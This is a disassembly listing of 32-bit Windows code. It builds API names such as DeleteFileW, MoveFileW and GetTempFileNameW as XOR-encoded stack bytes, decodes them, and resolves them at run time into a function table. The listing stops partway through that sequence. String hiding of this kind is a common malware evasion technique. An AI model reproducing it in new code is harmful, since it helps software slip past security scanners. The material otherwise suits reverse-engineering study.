  402f1a:	c6 85 e9 fe ff ff 31 	mov    BYTE PTR [ebp-0x117],0x31
  402f21:	c6 85 ea fe ff ff 30 	mov    BYTE PTR [ebp-0x116],0x30
  402f28:	c6 85 eb fe ff ff 05 	mov    BYTE PTR [ebp-0x115],0x5
  402f2f:	c6 85 ec fe ff ff 27 	mov    BYTE PTR [ebp-0x114],0x27
  402f36:	c6 85 ed fe ff ff 3a 	mov    BYTE PTR [ebp-0x113],0x3a
  402f3d:	c6 85 ee fe ff ff 36 	mov    BYTE PTR [ebp-0x112],0x36
  402f44:	c6 85 ef fe ff ff 30 	mov    BYTE PTR [ebp-0x111],0x30
  402f4b:	c6 85 f0 fe ff ff 26 	mov    BYTE PTR [ebp-0x110],0x26
  402f52:	c6 85 f1 fe ff ff 26 	mov    BYTE PTR [ebp-0x10f],0x26
  402f59:	88 85 f2 fe ff ff    	mov    BYTE PTR [ebp-0x10e],al
  402f5f:	c6 45 58 19          	mov    BYTE PTR [ebp+0x58],0x19
  402f63:	c6 45 59 3a          	mov    BYTE PTR [ebp+0x59],0x3a
  402f67:	c6 45 5a 36          	mov    BYTE PTR [ebp+0x5a],0x36
  402f6b:	c6 45 5b 34          	mov    BYTE PTR [ebp+0x5b],0x34
  402f6f:	c6 45 5c 39          	mov    BYTE PTR [ebp+0x5c],0x39
  402f73:	c6 45 5d 13          	mov    BYTE PTR [ebp+0x5d],0x13
  402f77:	c6 45 5e 27          	mov    BYTE PTR [ebp+0x5e],0x27
  402f7b:	c6 45 5f 30          	mov    BYTE PTR [ebp+0x5f],0x30
  402f7f:	c6 45 60 30          	mov    BYTE PTR [ebp+0x60],0x30
  402f83:	88 45 61             	mov    BYTE PTR [ebp+0x61],al
  402f86:	c6 45 28 11          	mov    BYTE PTR [ebp+0x28],0x11
  402f8a:	c6 45 29 30          	mov    BYTE PTR [ebp+0x29],0x30
  402f8e:	c6 45 2a 39          	mov    BYTE PTR [ebp+0x2a],0x39
  402f92:	c6 45 2b 30          	mov    BYTE PTR [ebp+0x2b],0x30
  402f96:	c6 45 2c 21          	mov    BYTE PTR [ebp+0x2c],0x21
  402f9a:	c6 45 2d 30          	mov    BYTE PTR [ebp+0x2d],0x30
  402f9e:	c6 45 2e 13          	mov    BYTE PTR [ebp+0x2e],0x13
  402fa2:	c6 45 2f 3c          	mov    BYTE PTR [ebp+0x2f],0x3c
  402fa6:	c6 45 30 39          	mov    BYTE PTR [ebp+0x30],0x39
  402faa:	c6 45 31 30          	mov    BYTE PTR [ebp+0x31],0x30
  402fae:	c6 45 32 02          	mov    BYTE PTR [ebp+0x32],0x2
  402fb2:	88 45 33             	mov    BYTE PTR [ebp+0x33],al
  402fb5:	c6 45 4c 18          	mov    BYTE PTR [ebp+0x4c],0x18
  402fb9:	c6 45 4d 3a          	mov    BYTE PTR [ebp+0x4d],0x3a
  402fbd:	c6 45 4e 23          	mov    BYTE PTR [ebp+0x4e],0x23
  402fc1:	c6 45 4f 30          	mov    BYTE PTR [ebp+0x4f],0x30
  402fc5:	c6 45 50 13          	mov    BYTE PTR [ebp+0x50],0x13
  402fc9:	c6 45 51 3c          	mov    BYTE PTR [ebp+0x51],0x3c
  402fcd:	c6 45 52 39          	mov    BYTE PTR [ebp+0x52],0x39
  402fd1:	c6 45 53 30          	mov    BYTE PTR [ebp+0x53],0x30
  402fd5:	c6 45 54 02          	mov    BYTE PTR [ebp+0x54],0x2
  402fd9:	88 45 55             	mov    BYTE PTR [ebp+0x55],al
  402fdc:	c6 45 d0 12          	mov    BYTE PTR [ebp-0x30],0x12
  402fe0:	c6 45 d1 30          	mov    BYTE PTR [ebp-0x2f],0x30
  402fe4:	c6 45 d2 21          	mov    BYTE PTR [ebp-0x2e],0x21
  402fe8:	c6 45 d3 01          	mov    BYTE PTR [ebp-0x2d],0x1
  402fec:	c6 45 d4 30          	mov    BYTE PTR [ebp-0x2c],0x30
  402ff0:	c6 45 d5 38          	mov    BYTE PTR [ebp-0x2b],0x38
  402ff4:	c6 45 d6 25          	mov    BYTE PTR [ebp-0x2a],0x25
  402ff8:	c6 45 d7 05          	mov    BYTE PTR [ebp-0x29],0x5
  402ffc:	c6 45 d8 34          	mov    BYTE PTR [ebp-0x28],0x34
  403000:	c6 45 d9 21          	mov    BYTE PTR [ebp-0x27],0x21
  403004:	c6 45 da 3d          	mov    BYTE PTR [ebp-0x26],0x3d
  403008:	c6 45 db 02          	mov    BYTE PTR [ebp-0x25],0x2
  40300c:	88 45 dc             	mov    BYTE PTR [ebp-0x24],al
  40300f:	c6 85 6c ff ff ff 12 	mov    BYTE PTR [ebp-0x94],0x12
  403016:	c6 85 6d ff ff ff 30 	mov    BYTE PTR [ebp-0x93],0x30
  40301d:	c6 85 6e ff ff ff 21 	mov    BYTE PTR [ebp-0x92],0x21
  403024:	c6 85 6f ff ff ff 01 	mov    BYTE PTR [ebp-0x91],0x1
  40302b:	c6 85 70 ff ff ff 30 	mov    BYTE PTR [ebp-0x90],0x30
  403032:	c6 85 71 ff ff ff 38 	mov    BYTE PTR [ebp-0x8f],0x38
  403039:	c6 85 72 ff ff ff 25 	mov    BYTE PTR [ebp-0x8e],0x25
  403040:	c6 85 73 ff ff ff 13 	mov    BYTE PTR [ebp-0x8d],0x13
  403047:	c6 85 74 ff ff ff 3c 	mov    BYTE PTR [ebp-0x8c],0x3c
  40304e:	c6 85 75 ff ff ff 39 	mov    BYTE PTR [ebp-0x8b],0x39
  403055:	c6 85 76 ff ff ff 30 	mov    BYTE PTR [ebp-0x8a],0x30
  40305c:	c6 85 77 ff ff ff 1b 	mov    BYTE PTR [ebp-0x89],0x1b
  403063:	c6 85 78 ff ff ff 34 	mov    BYTE PTR [ebp-0x88],0x34
  40306a:	c6 85 79 ff ff ff 38 	mov    BYTE PTR [ebp-0x87],0x38
  403071:	c6 85 7a ff ff ff 30 	mov    BYTE PTR [ebp-0x86],0x30
  403078:	c6 85 7b ff ff ff 02 	mov    BYTE PTR [ebp-0x85],0x2
  40307f:	88 85 7c ff ff ff    	mov    BYTE PTR [ebp-0x84],al
  403085:	c6 45 10 18          	mov    BYTE PTR [ebp+0x10],0x18
  403089:	c6 45 11 3a          	mov    BYTE PTR [ebp+0x11],0x3a
  40308d:	c6 45 12 23          	mov    BYTE PTR [ebp+0x12],0x23
  403091:	c6 45 13 30          	mov    BYTE PTR [ebp+0x13],0x30
  403095:	c6 45 14 13          	mov    BYTE PTR [ebp+0x14],0x13
  403099:	c6 45 15 3c          	mov    BYTE PTR [ebp+0x15],0x3c
  40309d:	c6 45 16 39          	mov    BYTE PTR [ebp+0x16],0x39
  4030a1:	c6 45 17 30          	mov    BYTE PTR [ebp+0x17],0x30
  4030a5:	c6 45 18 10          	mov    BYTE PTR [ebp+0x18],0x10
  4030a9:	c6 45 19 2d          	mov    BYTE PTR [ebp+0x19],0x2d
  4030ad:	c6 45 1a 02          	mov    BYTE PTR [ebp+0x1a],0x2
  4030b1:	88 45 1b             	mov    BYTE PTR [ebp+0x1b],al
  4030b4:	c6 85 8c fe ff ff 12 	mov    BYTE PTR [ebp-0x174],0x12
  4030bb:	c6 85 8d fe ff ff 30 	mov    BYTE PTR [ebp-0x173],0x30
  4030c2:	c6 85 8e fe ff ff 21 	mov    BYTE PTR [ebp-0x172],0x21
  4030c9:	c6 85 8f fe ff ff 10 	mov    BYTE PTR [ebp-0x171],0x10
  4030d0:	c6 85 90 fe ff ff 3b 	mov    BYTE PTR [ebp-0x170],0x3b
  4030d7:	c6 85 91 fe ff ff 23 	mov    BYTE PTR [ebp-0x16f],0x23
  4030de:	c6 85 92 fe ff ff 3c 	mov    BYTE PTR [ebp-0x16e],0x3c
  4030e5:	c6 85 93 fe ff ff 27 	mov    BYTE PTR [ebp-0x16d],0x27
  4030ec:	c6 85 94 fe ff ff 3a 	mov    BYTE PTR [ebp-0x16c],0x3a
  4030f3:	c6 85 95 fe ff ff 3b 	mov    BYTE PTR [ebp-0x16b],0x3b
  4030fa:	c6 85 96 fe ff ff 38 	mov    BYTE PTR [ebp-0x16a],0x38
  403101:	c6 85 97 fe ff ff 30 	mov    BYTE PTR [ebp-0x169],0x30
  403108:	c6 85 98 fe ff ff 3b 	mov    BYTE PTR [ebp-0x168],0x3b
  40310f:	c6 85 99 fe ff ff 21 	mov    BYTE PTR [ebp-0x167],0x21
  403116:	c6 85 9a fe ff ff 03 	mov    BYTE PTR [ebp-0x166],0x3
  40311d:	c6 85 9b fe ff ff 34 	mov    BYTE PTR [ebp-0x165],0x34
  403124:	c6 85 9c fe ff ff 27 	mov    BYTE PTR [ebp-0x164],0x27
  40312b:	c6 85 9d fe ff ff 3c 	mov    BYTE PTR [ebp-0x163],0x3c
  403132:	c6 85 9e fe ff ff 34 	mov    BYTE PTR [ebp-0x162],0x34
  403139:	c6 85 9f fe ff ff 37 	mov    BYTE PTR [ebp-0x161],0x37
  403140:	c6 85 a0 fe ff ff 39 	mov    BYTE PTR [ebp-0x160],0x39
  403147:	c6 85 a1 fe ff ff 30 	mov    BYTE PTR [ebp-0x15f],0x30
  40314e:	c6 85 a2 fe ff ff 02 	mov    BYTE PTR [ebp-0x15e],0x2
  403155:	88 85 a3 fe ff ff    	mov    BYTE PTR [ebp-0x15d],al
  40315b:	c6 85 74 fe ff ff 12 	mov    BYTE PTR [ebp-0x18c],0x12
  403162:	c6 85 75 fe ff ff 30 	mov    BYTE PTR [ebp-0x18b],0x30
  403169:	c6 85 76 fe ff ff 21 	mov    BYTE PTR [ebp-0x18a],0x21
  403170:	c6 85 77 fe ff ff 10 	mov    BYTE PTR [ebp-0x189],0x10
  403177:	c6 85 78 fe ff ff 3b 	mov    BYTE PTR [ebp-0x188],0x3b
  40317e:	c6 85 79 fe ff ff 23 	mov    BYTE PTR [ebp-0x187],0x23
  403185:	c6 85 7a fe ff ff 3c 	mov    BYTE PTR [ebp-0x186],0x3c
  40318c:	c6 85 7b fe ff ff 27 	mov    BYTE PTR [ebp-0x185],0x27
  403193:	c6 85 7c fe ff ff 3a 	mov    BYTE PTR [ebp-0x184],0x3a
  40319a:	c6 85 7d fe ff ff 3b 	mov    BYTE PTR [ebp-0x183],0x3b
  4031a1:	c6 85 7e fe ff ff 38 	mov    BYTE PTR [ebp-0x182],0x38
  4031a8:	c6 85 7f fe ff ff 30 	mov    BYTE PTR [ebp-0x181],0x30
  4031af:	c6 85 80 fe ff ff 3b 	mov    BYTE PTR [ebp-0x180],0x3b
  4031b6:	c6 85 81 fe ff ff 21 	mov    BYTE PTR [ebp-0x17f],0x21
  4031bd:	c6 85 82 fe ff ff 03 	mov    BYTE PTR [ebp-0x17e],0x3
  4031c4:	c6 85 83 fe ff ff 34 	mov    BYTE PTR [ebp-0x17d],0x34
  4031cb:	c6 85 84 fe ff ff 27 	mov    BYTE PTR [ebp-0x17c],0x27
  4031d2:	c6 85 85 fe ff ff 3c 	mov    BYTE PTR [ebp-0x17b],0x3c
  4031d9:	c6 85 86 fe ff ff 34 	mov    BYTE PTR [ebp-0x17a],0x34
  4031e0:	c6 85 87 fe ff ff 37 	mov    BYTE PTR [ebp-0x179],0x37
  4031e7:	c6 85 88 fe ff ff 39 	mov    BYTE PTR [ebp-0x178],0x39
  4031ee:	c6 85 89 fe ff ff 30 	mov    BYTE PTR [ebp-0x177],0x30
  4031f5:	c6 85 8a fe ff ff 14 	mov    BYTE PTR [ebp-0x176],0x14
  4031fc:	88 85 8b fe ff ff    	mov    BYTE PTR [ebp-0x175],al
  403202:	c6 85 a4 fe ff ff 12 	mov    BYTE PTR [ebp-0x15c],0x12
  403209:	c6 85 a5 fe ff ff 30 	mov    BYTE PTR [ebp-0x15b],0x30
  403210:	c6 85 a6 fe ff ff 21 	mov    BYTE PTR [ebp-0x15a],0x21
  403217:	c6 85 a7 fe ff ff 1b 	mov    BYTE PTR [ebp-0x159],0x1b
  40321e:	c6 85 a8 fe ff ff 34 	mov    BYTE PTR [ebp-0x158],0x34
  403225:	c6 85 a9 fe ff ff 21 	mov    BYTE PTR [ebp-0x157],0x21
  40322c:	c6 85 aa fe ff ff 3c 	mov    BYTE PTR [ebp-0x156],0x3c
  403233:	c6 85 ab fe ff ff 23 	mov    BYTE PTR [ebp-0x155],0x23
  40323a:	c6 85 ac fe ff ff 30 	mov    BYTE PTR [ebp-0x154],0x30
  403241:	c6 85 ad fe ff ff 06 	mov    BYTE PTR [ebp-0x153],0x6
  403248:	c6 85 ae fe ff ff 2c 	mov    BYTE PTR [ebp-0x152],0x2c
  40324f:	c6 85 af fe ff ff 26 	mov    BYTE PTR [ebp-0x151],0x26
  403256:	c6 85 b0 fe ff ff 21 	mov    BYTE PTR [ebp-0x150],0x21
  40325d:	c6 85 b1 fe ff ff 30 	mov    BYTE PTR [ebp-0x14f],0x30
  403264:	c6 85 b2 fe ff ff 38 	mov    BYTE PTR [ebp-0x14e],0x38
  40326b:	c6 85 b3 fe ff ff 1c 	mov    BYTE PTR [ebp-0x14d],0x1c
  403272:	c6 85 b4 fe ff ff 3b 	mov    BYTE PTR [ebp-0x14c],0x3b
  403279:	c6 85 b5 fe ff ff 33 	mov    BYTE PTR [ebp-0x14b],0x33
  403280:	c6 85 b6 fe ff ff 3a 	mov    BYTE PTR [ebp-0x14a],0x3a
  403287:	88 85 b7 fe ff ff    	mov    BYTE PTR [ebp-0x149],al
  40328d:	c6 45 70 06          	mov    BYTE PTR [ebp+0x70],0x6
  403291:	c6 45 71 39          	mov    BYTE PTR [ebp+0x71],0x39
  403295:	c6 45 72 30          	mov    BYTE PTR [ebp+0x72],0x30
  403299:	c6 45 73 30          	mov    BYTE PTR [ebp+0x73],0x30
  40329d:	c6 45 74 25          	mov    BYTE PTR [ebp+0x74],0x25
  4032a1:	88 45 75             	mov    BYTE PTR [ebp+0x75],al
  4032a4:	c6 85 58 ff ff ff 12 	mov    BYTE PTR [ebp-0xa8],0x12
  4032ab:	c6 85 59 ff ff ff 30 	mov    BYTE PTR [ebp-0xa7],0x30
  4032b2:	c6 85 5a ff ff ff 21 	mov    BYTE PTR [ebp-0xa6],0x21
  4032b9:	c6 85 5b ff ff ff 01 	mov    BYTE PTR [ebp-0xa5],0x1
  4032c0:	c6 85 5c ff ff ff 30 	mov    BYTE PTR [ebp-0xa4],0x30
  4032c7:	c6 85 5d ff ff ff 38 	mov    BYTE PTR [ebp-0xa3],0x38
  4032ce:	c6 85 5e ff ff ff 25 	mov    BYTE PTR [ebp-0xa2],0x25
  4032d5:	c6 85 5f ff ff ff 13 	mov    BYTE PTR [ebp-0xa1],0x13
  4032dc:	c6 85 60 ff ff ff 3c 	mov    BYTE PTR [ebp-0xa0],0x3c
  4032e3:	c6 85 61 ff ff ff 39 	mov    BYTE PTR [ebp-0x9f],0x39
  4032ea:	c6 85 62 ff ff ff 30 	mov    BYTE PTR [ebp-0x9e],0x30
  4032f1:	c6 85 63 ff ff ff 1b 	mov    BYTE PTR [ebp-0x9d],0x1b
  4032f8:	c6 85 64 ff ff ff 34 	mov    BYTE PTR [ebp-0x9c],0x34
  4032ff:	c6 85 65 ff ff ff 38 	mov    BYTE PTR [ebp-0x9b],0x38
  403306:	c6 85 66 ff ff ff 30 	mov    BYTE PTR [ebp-0x9a],0x30
  40330d:	c6 85 67 ff ff ff 14 	mov    BYTE PTR [ebp-0x99],0x14
  403314:	88 85 68 ff ff ff    	mov    BYTE PTR [ebp-0x98],al
  40331a:	c6 45 f8 12          	mov    BYTE PTR [ebp-0x8],0x12
  40331e:	c6 45 f9 30          	mov    BYTE PTR [ebp-0x7],0x30
  403322:	c6 45 fa 21          	mov    BYTE PTR [ebp-0x6],0x21
  403326:	c6 45 fb 13          	mov    BYTE PTR [ebp-0x5],0x13
  40332a:	c6 45 fc 3c          	mov    BYTE PTR [ebp-0x4],0x3c
  40332e:	c6 45 fd 39          	mov    BYTE PTR [ebp-0x3],0x39
  403332:	c6 45 fe 30          	mov    BYTE PTR [ebp-0x2],0x30
  403336:	c6 45 ff 01          	mov    BYTE PTR [ebp-0x1],0x1
  40333a:	c6 45 00 3c          	mov    BYTE PTR [ebp+0x0],0x3c
  40333e:	c6 45 01 38          	mov    BYTE PTR [ebp+0x1],0x38
  403342:	c6 45 02 30          	mov    BYTE PTR [ebp+0x2],0x30
  403346:	88 45 03             	mov    BYTE PTR [ebp+0x3],al
  403349:	c6 45 e0 06          	mov    BYTE PTR [ebp-0x20],0x6
  40334d:	c6 45 e1 30          	mov    BYTE PTR [ebp-0x1f],0x30
  403351:	c6 45 e2 21          	mov    BYTE PTR [ebp-0x1e],0x21
  403355:	c6 45 e3 13          	mov    BYTE PTR [ebp-0x1d],0x13
  403359:	c6 45 e4 3c          	mov    BYTE PTR [ebp-0x1c],0x3c
  40335d:	c6 45 e5 39          	mov    BYTE PTR [ebp-0x1b],0x39
  403361:	c6 45 e6 30          	mov    BYTE PTR [ebp-0x1a],0x30
  403365:	c6 45 e7 01          	mov    BYTE PTR [ebp-0x19],0x1
  403369:	c6 45 e8 3c          	mov    BYTE PTR [ebp-0x18],0x3c
  40336d:	c6 45 e9 38          	mov    BYTE PTR [ebp-0x17],0x38
  403371:	c6 45 ea 30          	mov    BYTE PTR [ebp-0x16],0x30
  403375:	88 45 eb             	mov    BYTE PTR [ebp-0x15],al
  403378:	33 c9                	xor    ecx,ecx
  40337a:	30 84 0d 58 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x1a8],al
  403381:	41                   	inc    ecx
  403382:	83 f9 1a             	cmp    ecx,0x1a
  403385:	72 f3                	jb     0x40337a
  403387:	56                   	push   esi
  403388:	57                   	push   edi
  403389:	6a 0c                	push   0xc
  40338b:	33 c9                	xor    ecx,ecx
  40338d:	5e                   	pop    esi
  40338e:	30 44 0d 1c          	xor    BYTE PTR [ebp+ecx*1+0x1c],al
  403392:	41                   	inc    ecx
  403393:	3b ce                	cmp    ecx,esi
  403395:	72 f7                	jb     0x40338e
  403397:	33 c9                	xor    ecx,ecx
  403399:	30 84 0d 1c ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0xe4],al
  4033a0:	41                   	inc    ecx
  4033a1:	83 f9 13             	cmp    ecx,0x13
  4033a4:	72 f3                	jb     0x403399
  4033a6:	33 c9                	xor    ecx,ecx
  4033a8:	30 84 0d b8 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x148],al
  4033af:	41                   	inc    ecx
  4033b0:	83 f9 14             	cmp    ecx,0x14
  4033b3:	72 f3                	jb     0x4033a8
  4033b5:	33 c9                	xor    ecx,ecx
  4033b7:	30 44 0d 04          	xor    BYTE PTR [ebp+ecx*1+0x4],al
  4033bb:	41                   	inc    ecx
  4033bc:	3b ce                	cmp    ecx,esi
  4033be:	72 f7                	jb     0x4033b7
  4033c0:	6a 0d                	push   0xd
  4033c2:	33 c9                	xor    ecx,ecx
  4033c4:	5a                   	pop    edx
  4033c5:	30 44 0d b0          	xor    BYTE PTR [ebp+ecx*1-0x50],al
  4033c9:	41                   	inc    ecx
  4033ca:	3b ca                	cmp    ecx,edx
  4033cc:	72 f7                	jb     0x4033c5
  4033ce:	33 c9                	xor    ecx,ecx
  4033d0:	30 44 0d a0          	xor    BYTE PTR [ebp+ecx*1-0x60],al
  4033d4:	41                   	inc    ecx
  4033d5:	3b ca                	cmp    ecx,edx
  4033d7:	72 f7                	jb     0x4033d0
  4033d9:	33 c9                	xor    ecx,ecx
  4033db:	30 84 0d f4 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x10c],al
  4033e2:	41                   	inc    ecx
  4033e3:	83 f9 13             	cmp    ecx,0x13
  4033e6:	72 f3                	jb     0x4033db
  4033e8:	33 c9                	xor    ecx,ecx
  4033ea:	30 44 0d 90          	xor    BYTE PTR [ebp+ecx*1-0x70],al
  4033ee:	41                   	inc    ecx
  4033ef:	83 f9 0e             	cmp    ecx,0xe
  4033f2:	72 f6                	jb     0x4033ea
  4033f4:	33 c9                	xor    ecx,ecx
  4033f6:	30 44 0d c0          	xor    BYTE PTR [ebp+ecx*1-0x40],al
  4033fa:	41                   	inc    ecx
  4033fb:	3b ca                	cmp    ecx,edx
  4033fd:	72 f7                	jb     0x4033f6
  4033ff:	33 c9                	xor    ecx,ecx
  403401:	30 44 0d 40          	xor    BYTE PTR [ebp+ecx*1+0x40],al
  403405:	41                   	inc    ecx
  403406:	3b ce                	cmp    ecx,esi
  403408:	72 f7                	jb     0x403401
  40340a:	33 c9                	xor    ecx,ecx
  40340c:	30 44 0d 80          	xor    BYTE PTR [ebp+ecx*1-0x80],al
  403410:	41                   	inc    ecx
  403411:	83 f9 0f             	cmp    ecx,0xf
  403414:	72 f6                	jb     0x40340c
  403416:	33 c9                	xor    ecx,ecx
  403418:	30 44 0d ec          	xor    BYTE PTR [ebp+ecx*1-0x14],al
  40341c:	41                   	inc    ecx
  40341d:	3b ce                	cmp    ecx,esi
  40341f:	72 f7                	jb     0x403418
  403421:	33 c9                	xor    ecx,ecx
  403423:	30 84 0d 08 ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0xf8],al
  40342a:	41                   	inc    ecx
  40342b:	83 f9 13             	cmp    ecx,0x13
  40342e:	72 f3                	jb     0x403423
  403430:	33 c9                	xor    ecx,ecx
  403432:	30 44 0d 34          	xor    BYTE PTR [ebp+ecx*1+0x34],al
  403436:	41                   	inc    ecx
  403437:	3b ce                	cmp    ecx,esi
  403439:	72 f7                	jb     0x403432
  40343b:	33 c9                	xor    ecx,ecx
  40343d:	30 44 0d 64          	xor    BYTE PTR [ebp+ecx*1+0x64],al
  403441:	41                   	inc    ecx
  403442:	83 f9 0a             	cmp    ecx,0xa
  403445:	72 f6                	jb     0x40343d
  403447:	33 c9                	xor    ecx,ecx
  403449:	30 84 0d cc fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x134],al
  403450:	41                   	inc    ecx
  403451:	83 f9 14             	cmp    ecx,0x14
  403454:	72 f3                	jb     0x403449
  403456:	33 c9                	xor    ecx,ecx
  403458:	30 84 0d 30 ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0xd0],al
  40345f:	41                   	inc    ecx
  403460:	83 f9 12             	cmp    ecx,0x12
  403463:	72 f3                	jb     0x403458
  403465:	33 c9                	xor    ecx,ecx
  403467:	30 84 0d 44 ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0xbc],al
  40346e:	41                   	inc    ecx
  40346f:	83 f9 11             	cmp    ecx,0x11
  403472:	72 f3                	jb     0x403467
  403474:	33 c9                	xor    ecx,ecx
  403476:	30 84 0d e0 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x120],al
  40347d:	41                   	inc    ecx
  40347e:	83 f9 13             	cmp    ecx,0x13
  403481:	72 f3                	jb     0x403476
  403483:	33 c9                	xor    ecx,ecx
  403485:	30 44 0d 58          	xor    BYTE PTR [ebp+ecx*1+0x58],al
  403489:	41                   	inc    ecx
  40348a:	83 f9 0a             	cmp    ecx,0xa
  40348d:	72 f6                	jb     0x403485
  40348f:	33 c9                	xor    ecx,ecx
  403491:	30 44 0d 28          	xor    BYTE PTR [ebp+ecx*1+0x28],al
  403495:	41                   	inc    ecx
  403496:	3b ce                	cmp    ecx,esi
  403498:	72 f7                	jb     0x403491
  40349a:	33 c9                	xor    ecx,ecx
  40349c:	30 44 0d 4c          	xor    BYTE PTR [ebp+ecx*1+0x4c],al
  4034a0:	41                   	inc    ecx
  4034a1:	83 f9 0a             	cmp    ecx,0xa
  4034a4:	72 f6                	jb     0x40349c
  4034a6:	33 c9                	xor    ecx,ecx
  4034a8:	30 44 0d d0          	xor    BYTE PTR [ebp+ecx*1-0x30],al
  4034ac:	41                   	inc    ecx
  4034ad:	3b ca                	cmp    ecx,edx
  4034af:	72 f7                	jb     0x4034a8
  4034b1:	33 c9                	xor    ecx,ecx
  4034b3:	30 84 0d 6c ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0x94],al
  4034ba:	41                   	inc    ecx
  4034bb:	83 f9 11             	cmp    ecx,0x11
  4034be:	72 f3                	jb     0x4034b3
  4034c0:	33 c9                	xor    ecx,ecx
  4034c2:	30 44 0d 10          	xor    BYTE PTR [ebp+ecx*1+0x10],al
  4034c6:	41                   	inc    ecx
  4034c7:	3b ce                	cmp    ecx,esi
  4034c9:	72 f7                	jb     0x4034c2
  4034cb:	33 c9                	xor    ecx,ecx
  4034cd:	30 84 0d 8c fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x174],al
  4034d4:	41                   	inc    ecx
  4034d5:	83 f9 18             	cmp    ecx,0x18
  4034d8:	72 f3                	jb     0x4034cd
  4034da:	33 c9                	xor    ecx,ecx
  4034dc:	30 84 0d 74 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x18c],al
  4034e3:	41                   	inc    ecx
  4034e4:	83 f9 18             	cmp    ecx,0x18
  4034e7:	72 f3                	jb     0x4034dc
  4034e9:	33 c9                	xor    ecx,ecx
  4034eb:	30 84 0d a4 fe ff ff 	xor    BYTE PTR [ebp+ecx*1-0x15c],al
  4034f2:	41                   	inc    ecx
  4034f3:	83 f9 14             	cmp    ecx,0x14
  4034f6:	72 f3                	jb     0x4034eb
  4034f8:	33 c9                	xor    ecx,ecx
  4034fa:	30 44 0d 70          	xor    BYTE PTR [ebp+ecx*1+0x70],al
  4034fe:	41                   	inc    ecx
  4034ff:	83 f9 06             	cmp    ecx,0x6
  403502:	72 f6                	jb     0x4034fa
  403504:	33 c9                	xor    ecx,ecx
  403506:	30 84 0d 58 ff ff ff 	xor    BYTE PTR [ebp+ecx*1-0xa8],al
  40350d:	41                   	inc    ecx
  40350e:	83 f9 11             	cmp    ecx,0x11
  403511:	72 f3                	jb     0x403506
  403513:	33 c9                	xor    ecx,ecx
  403515:	30 44 0d f8          	xor    BYTE PTR [ebp+ecx*1-0x8],al
  403519:	41                   	inc    ecx
  40351a:	3b ce                	cmp    ecx,esi
  40351c:	72 f7                	jb     0x403515
  40351e:	33 c9                	xor    ecx,ecx
  403520:	30 44 0d e0          	xor    BYTE PTR [ebp+ecx*1-0x20],al
  403524:	41                   	inc    ecx
  403525:	3b ce                	cmp    ecx,esi
  403527:	72 f7                	jb     0x403520
  403529:	68 84 00 00 00       	push   0x84
  40352e:	e8 c4 da 00 00       	call   0x410ff7
  403533:	a3 cc 69 48 00       	mov    ds:0x4869cc,eax
  403538:	59                   	pop    ecx
  403539:	8d 85 58 fe ff ff    	lea    eax,[ebp-0x1a8]
  40353f:	50                   	push   eax
  403540:	ff 15 54 11 42 00    	call   DWORD PTR ds:0x421154
  403546:	8b 35 50 11 42 00    	mov    esi,DWORD PTR ds:0x421150
  40354c:	8b f8                	mov    edi,eax
  40354e:	8d 45 1c             	lea    eax,[ebp+0x1c]
  403551:	50                   	push   eax
  403552:	57                   	push   edi
  403553:	ff d6                	call   esi
  403555:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40355b:	89 01                	mov    DWORD PTR [ecx],eax
  40355d:	8d 85 1c ff ff ff    	lea    eax,[ebp-0xe4]
  403563:	50                   	push   eax
  403564:	57                   	push   edi
  403565:	ff d6                	call   esi
  403567:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40356d:	89 41 04             	mov    DWORD PTR [ecx+0x4],eax
  403570:	8d 85 b8 fe ff ff    	lea    eax,[ebp-0x148]
  403576:	50                   	push   eax
  403577:	57                   	push   edi
  403578:	ff d6                	call   esi
  40357a:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403580:	89 41 08             	mov    DWORD PTR [ecx+0x8],eax
  403583:	8d 45 04             	lea    eax,[ebp+0x4]
  403586:	50                   	push   eax
  403587:	57                   	push   edi
  403588:	ff d6                	call   esi
  40358a:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403590:	89 41 0c             	mov    DWORD PTR [ecx+0xc],eax
  403593:	8d 45 b0             	lea    eax,[ebp-0x50]
  403596:	50                   	push   eax
  403597:	57                   	push   edi
  403598:	ff d6                	call   esi
  40359a:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035a0:	89 41 10             	mov    DWORD PTR [ecx+0x10],eax
  4035a3:	8d 45 a0             	lea    eax,[ebp-0x60]
  4035a6:	50                   	push   eax
  4035a7:	57                   	push   edi
  4035a8:	ff d6                	call   esi
  4035aa:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035b0:	89 41 14             	mov    DWORD PTR [ecx+0x14],eax
  4035b3:	8d 85 f4 fe ff ff    	lea    eax,[ebp-0x10c]
  4035b9:	50                   	push   eax
  4035ba:	57                   	push   edi
  4035bb:	ff d6                	call   esi
  4035bd:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035c3:	89 41 18             	mov    DWORD PTR [ecx+0x18],eax
  4035c6:	8d 45 90             	lea    eax,[ebp-0x70]
  4035c9:	50                   	push   eax
  4035ca:	57                   	push   edi
  4035cb:	ff d6                	call   esi
  4035cd:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035d3:	89 41 1c             	mov    DWORD PTR [ecx+0x1c],eax
  4035d6:	8d 45 c0             	lea    eax,[ebp-0x40]
  4035d9:	50                   	push   eax
  4035da:	57                   	push   edi
  4035db:	ff d6                	call   esi
  4035dd:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035e3:	89 41 20             	mov    DWORD PTR [ecx+0x20],eax
  4035e6:	8d 45 40             	lea    eax,[ebp+0x40]
  4035e9:	50                   	push   eax
  4035ea:	57                   	push   edi
  4035eb:	ff d6                	call   esi
